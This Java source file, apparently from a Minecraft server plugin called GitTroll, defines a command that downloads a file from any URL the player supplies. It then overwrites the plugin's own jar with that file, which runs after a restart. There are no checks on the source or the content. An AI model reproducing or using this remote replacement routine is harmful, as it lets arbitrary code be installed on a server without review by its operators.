package net.Lenni0451.GitTroll.command.commands.plugin;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.net.URL;
import java.nio.file.Files;
import java.util.List;

import org.bukkit.Bukkit;

import net.Lenni0451.GitTroll.GitTroll;
import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class UpdateVersion extends CommandBase {

	public UpdateVersion() {
		super("UpdateVersion", "Enter a link to download and replace the current GitTroll version", "<Download Link>");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isLength(1)) {
			Bukkit.getScheduler().runTaskAsynchronously(GitTroll.getInstance(), () -> {
				try {
					URL url = new URL(args.getString(0));
					
					executor.sendGitMessage("Downloading plugin...");
					
					ByteArrayOutputStream baos = new ByteArrayOutputStream();
					BufferedInputStream bis = new BufferedInputStream(url.openConnection().getInputStream());
					byte[] buffer = new byte[1024];
					int length;
					while((length = bis.read(buffer)) != -1) {
						baos.write(buffer, 0, length);
					}
					bis.close();

					executor.sendGitMessage("Writing plugin...");
					Files.write(GitTroll.getPluginFile().toPath(), baos.toByteArray());
					
					executor.sendGitMessage("The plugin has been replaced. The server has to be reloaded/restarted.");
				} catch (Exception e) {
					executor.sendGitMessage("§cThe plugin could not be downloaded.");
				}
			});
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}

}
